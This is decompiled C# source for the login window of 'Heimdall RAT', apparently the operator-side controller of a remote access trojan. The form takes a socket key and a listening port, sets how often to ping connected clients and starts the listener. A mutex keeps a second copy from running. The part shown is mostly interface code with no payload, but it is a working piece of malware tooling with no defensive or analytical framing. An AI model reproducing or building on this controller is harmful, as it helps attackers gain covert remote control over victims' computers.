using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using ClientG.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class LoginGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("SKtextb")]
	private TextBox _SKtextb;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("lPorttextb")]
	private NumericUpDown _lPorttextb;

	[AccessedThroughProperty("reping")]
	private NumericUpDown _reping;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	public bool OW;

	public Mutex MT;

	public string MUTEX;

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual TextBox SKtextb
	{
		[DebuggerNonUserCode]
		get
		{
			return _SKtextb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_SKtextb = value;
		}
	}

	internal virtual GroupBox GroupBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = GroupBox1_Enter;
			if (_GroupBox1 != null)
			{
				((Control)_GroupBox1).remove_Enter(eventHandler);
			}
			_GroupBox1 = value;
			if (_GroupBox1 != null)
			{
				((Control)_GroupBox1).add_Enter(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	internal virtual NumericUpDown lPorttextb
	{
		[DebuggerNonUserCode]
		get
		{
			return _lPorttextb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lPorttextb = value;
		}
	}

	internal virtual NumericUpDown reping
	{
		[DebuggerNonUserCode]
		get
		{
			return _reping;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_reping = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	public LoginGR()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Login_Load);
		((Control)this).add_GiveFeedback(new GiveFeedbackEventHandler(Login_GiveFeedback));
		__ENCAddToList(this);
		OW = false;
		MUTEX = "IS*ME*HERE*OrionSec";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Expected O, but got Unknown
		//IL_0199: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a3: Expected O, but got Unknown
		//IL_023c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0246: Expected O, but got Unknown
		//IL_02d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02da: Expected O, but got Unknown
		//IL_03b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bd: Expected O, but got Unknown
		//IL_0455: Unknown result type (might be due to invalid IL or missing references)
		//IL_045f: Expected O, but got Unknown
		//IL_0548: Unknown result type (might be due to invalid IL or missing references)
		//IL_0552: Expected O, but got Unknown
		//IL_05ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f9: Expected O, but got Unknown
		//IL_0715: Unknown result type (might be due to invalid IL or missing references)
		//IL_071f: Expected O, but got Unknown
		//IL_07bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c9: Expected O, but got Unknown
		//IL_085c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0866: Expected O, but got Unknown
		//IL_08f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0902: Expected O, but got Unknown
		//IL_099a: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a4: Expected O, but got Unknown
		//IL_0a58: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a62: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(LoginGR));
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		SKtextb = new TextBox();
		GroupBox1 = new GroupBox();
		lPorttextb = new NumericUpDown();
		Button2 = new Button();
		reping = new NumericUpDown();
		Label4 = new Label();
		Label5 = new Label();
		PictureBox1 = new PictureBox();
		Label6 = new Label();
		((Control)GroupBox1).SuspendLayout();
		((ISupportInitialize)lPorttextb).BeginInit();
		((ISupportInitialize)reping).BeginInit();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.CornflowerBlue);
		Label label = Label1;
		Point location = new Point(72, 19);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(37, 25);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("He");
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("Segoe UI", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.Lime);
		Label label3 = Label2;
		location = new Point(6, 19);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(71, 17);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(4);
		Label2.set_Text("Password :");
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.Transparent);
		((Control)Label3).set_Font(new Font("Segoe UI", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.Lime);
		Label label5 = Label3;
		location = new Point(96, 47);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(39, 17);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(5);
		Label3.set_Text("Port :");
		((TextBoxBase)SKtextb).set_BorderStyle((BorderStyle)0);
		((Control)SKtextb).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox sKtextb = SKtextb;
		location = new Point(90, 20);
		((Control)sKtextb).set_Location(location);
		((Control)SKtextb).set_Name("SKtextb");
		TextBox sKtextb2 = SKtextb;
		size = new Size(192, 15);
		((Control)sKtextb2).set_Size(size);
		((Control)SKtextb).set_TabIndex(7);
		SKtextb.set_Text("123");
		((Control)GroupBox1).set_BackColor(Color.Transparent);
		((Control)GroupBox1).get_Controls().Add((Control)(object)SKtextb);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)lPorttextb);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox1).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)GroupBox1).set_ForeColor(Color.Lime);
		GroupBox groupBox = GroupBox1;
		location = new Point(4, 46);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox2 = GroupBox1;
		size = new Size(289, 75);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox1).set_TabIndex(8);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Connectivity :");
		((UpDownBase)lPorttextb).set_BorderStyle((BorderStyle)0);
		((Control)lPorttextb).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		NumericUpDown obj = lPorttextb;
		location = new Point(139, 48);
		((Control)obj).set_Location(location);
		NumericUpDown obj2 = lPorttextb;
		decimal num = new decimal(new int[4] { 9999, 0, 0, 0 });
		obj2.set_Maximum(num);
		((Control)lPorttextb).set_Name("lPorttextb");
		NumericUpDown obj3 = lPorttextb;
		size = new Size(51, 18);
		((Control)obj3).set_Size(size);
		((Control)lPorttextb).set_TabIndex(6);
		NumericUpDown obj4 = lPorttextb;
		num = new decimal(new int[4] { 1604, 0, 0, 0 });
		obj4.set_Value(num);
		((ButtonBase)Button2).set_BackColor(SystemColors.HotTrack);
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)1);
		((Control)Button2).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button2).set_ForeColor(Color.White);
		Button button = Button2;
		location = new Point(56, 162);
		((Control)button).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button2 = Button2;
		size = new Size(184, 23);
		((Control)button2).set_Size(size);
		((Control)Button2).set_TabIndex(9);
		((ButtonBase)Button2).set_Text("Start Listening");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		((UpDownBase)reping).set_BorderStyle((BorderStyle)0);
		((Control)reping).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		NumericUpDown obj5 = reping;
		location = new Point(215, 130);
		((Control)obj5).set_Location(location);
		NumericUpDown obj6 = reping;
		num = new decimal(new int[4] { 9999, 0, 0, 0 });
		obj6.set_Maximum(num);
		NumericUpDown obj7 = reping;
		num = new decimal(new int[4] { 1, 0, 0, 0 });
		obj7.set_Minimum(num);
		((Control)reping).set_Name("reping");
		NumericUpDown obj8 = reping;
		size = new Size(50, 17);
		((Control)obj8).set_Size(size);
		((Control)reping).set_TabIndex(11);
		NumericUpDown obj9 = reping;
		num = new decimal(new int[4] { 45, 0, 0, 0 });
		obj9.set_Value(num);
		Label4.set_AutoSize(true);
		((Control)Label4).set_BackColor(Color.Transparent);
		((Control)Label4).set_Font(new Font("Segoe UI", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.Lime);
		Label label7 = Label4;
		location = new Point(7, 130);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(207, 15);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(10);
		Label4.set_Text("Automatically Ping each Client every :");
		Label5.set_AutoSize(true);
		((Control)Label5).set_BackColor(Color.Transparent);
		((Control)Label5).set_Font(new Font("Segoe UI", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.Lime);
		Label label9 = Label5;
		location = new Point(268, 131);
		((Control)label9).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label10 = Label5;
		size = new Size(24, 13);
		((Control)label10).set_Size(size);
		((Control)Label5).set_TabIndex(12);
		Label5.set_Text("Sec");
		((Control)PictureBox1).set_BackColor(Color.Transparent);
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		PictureBox pictureBox = PictureBox1;
		location = new Point(19, 5);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(47, 39);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(13);
		PictureBox1.set_TabStop(false);
		Label6.set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.Transparent);
		((Control)Label6).set_Font(new Font("Microsoft Sans Serif", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.CornflowerBlue);
		Label label11 = Label6;
		location = new Point(102, 19);
		((Control)label11).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label12 = Label6;
		size = new Size(112, 25);
		((Control)label12).set_Size(size);
		((Control)Label6).set_TabIndex(14);
		Label6.set_Text("imdall RAT ");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		size = new Size(297, 197);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)reping);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("LoginGR");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Login");
		((Form)this).set_TopMost(true);
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((ISupportInitialize)lPorttextb).EndInit();
		((ISupportInitialize)reping).EndInit();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		try
		{
			Application.Exit();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private bool testSelectedPort(int port)
	{
		IPGlobalProperties iPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
		TcpConnectionInformation[] activeTcpConnections = iPGlobalProperties.GetActiveTcpConnections();
		TcpConnectionInformation[] array = activeTcpConnections;
		foreach (TcpConnectionInformation tcpConnectionInformation in array)
		{
			if (tcpConnectionInformation.LocalEndPoint.Port == port)
			{
				break;
			}
		}
		bool result = default(bool);
		return result;
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(SKtextb.get_Text(), "", false) == 0)
		{
			MessageBox.Show("Oops ;)" + Environment.NewLine + "Please Add Your Socket Key First Then Continue !", "Heimdall Rat ", (MessageBoxButtons)0, (MessageBoxIcon)48);
			return;
		}
		if (Information.IsNothing((object)lPorttextb.get_Value().ToString()))
		{
			MessageBox.Show("Oops ;)" + Environment.NewLine + "Please Add Your Listening Port First Then Continue !", "Heimdall Rat ", (MessageBoxButtons)0, (MessageBoxIcon)48);
			return;
		}
		try
		{
			MyProject.Forms.FrmMAINGR.Key = SKtextb.get_Text();
			MyProject.Forms.FrmMAINGR.reping = Convert.ToInt32(decimal.Multiply(reping.get_Value(), new decimal(1000L)));
			MyProject.Forms.FrmMAINGR.CPORT = Convert.ToInt32(lPorttextb.get_Value());
			MyProject.Forms.FrmMAINGR.s.Start(Convert.ToInt32(lPorttextb.get_Value()));
			ST();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			MessageBox.Show("Oops ;)" + Environment.NewLine + "Port Used By Other Process !", "Heimdall Rat ", (MessageBoxButtons)0, (MessageBoxIcon)48);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Login_Load(object sender, EventArgs e)
	{
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MT = new Mutex(initiallyOwned: true, MUTEX, out OW);
			if (!OW)
			{
				MessageBox.Show("Heimdall-RAT already running !", "Heimdall Rat ", (MessageBoxButtons)0, (MessageBoxIcon)48);
				ProjectData.EndApp();
				Application.add_ApplicationExit((EventHandler)delegate
				{
					((VB_0024AnonymousDelegate_0)delegate
					{
						MT.ReleaseMutex();
					})();
				});
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((Form)this).set_Text("Heimdall-RAT   | @" + Environment.MachineName);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void ST()
	{
		//IL_01e7: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			((ToolStripItem)MyProject.Forms.FrmMAINGR.clientslabel).set_Text("Connected Clients : ( *C* ) | Selected Clients : ( *S* )".Replace("*C*", Conversions.ToString(MyProject.Forms.FrmMAINGR.listV1.get_Items().get_Count())).Replace("*S*", Conversions.ToString(MyProject.Forms.FrmMAINGR.listV1.get_SelectedItems().get_Count())));
			ListViewItem val = MyProject.Forms.FrmMAINGR.Logs.get_Items().Add("[ " + Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))) + " ] Heimdall RAT Started ..", MyProject.Forms.FrmMAINGR.ImageList1.get_Images().IndexOfKey("--.png"));
			val.get_SubItems().Add("...").set_ForeColor(Color.Blue);
			val.set_ForeColor(Color.Blue);
			val.set_ToolTipText("Unknown.png");
			ListViewItem val2 = MyProject.Forms.FrmMAINGR.Logs.get_Items().Add("[ " + Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))) + " ] Listening : " + lPorttextb.get_Value(), MyProject.Forms.FrmMAINGR.ImageList1.get_Images().IndexOfKey("--.png"));
			val2.get_SubItems().Add("...").set_ForeColor(Color.Purple);
			val2.set_ForeColor(Color.Purple);
			val2.set_ToolTipText("Unknown.png");
			Thread thread = new Thread(MyProject.Forms.FrmMAINGR.SDAPC);
			thread.Start();
			((Control)MyProject.Forms.FrmMAINGR).Show();
			((Form)this).Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message.ToString(), "Heimdall-RAT", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Login_GiveFeedback(object sender, GiveFeedbackEventArgs e)
	{
		ProjectData.EndApp();
	}

	private void GroupBox1_Enter(object sender, EventArgs e)
	{
	}
}
